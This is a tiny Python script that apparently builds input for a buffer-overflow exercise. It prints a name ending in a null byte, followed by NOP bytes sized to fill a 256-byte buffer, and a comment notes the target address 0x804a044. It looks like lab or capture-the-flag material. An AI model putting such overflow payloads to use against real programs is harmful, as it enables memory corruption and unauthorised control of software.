#!/usr/bin/python

# address of completed: 0x804a044
name = "Jamie Floyd\x00"
buf = "\x90"*(256-12) # fills up 256 long buffer
print name+buf
